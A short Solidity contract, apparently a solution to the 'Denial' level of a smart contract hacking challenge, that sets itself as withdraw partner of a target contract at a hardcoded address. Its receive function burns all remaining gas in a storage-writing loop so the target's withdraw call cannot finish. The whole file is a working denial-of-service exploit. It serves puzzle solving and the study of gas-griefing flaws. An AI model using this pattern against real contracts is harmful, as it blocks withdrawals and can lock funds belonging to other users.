// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../instances/Ilevel20.sol";

contract DenialHack {
    Denial level20 =
        Denial(payable(0xc043F9F2AE15E36a8a8De804c03A015115d9c0Bd));

    uint n;

    //constructor
    constructor() {
        level20.setWithdrawPartner(address(this));
    }

    //Burn all the gas by writing to storage until there's none left for the next line of withdraw() to execute
    receive() external payable {
        while (gasleft() > 0) {
            n = n + 1;
        }
    }
}
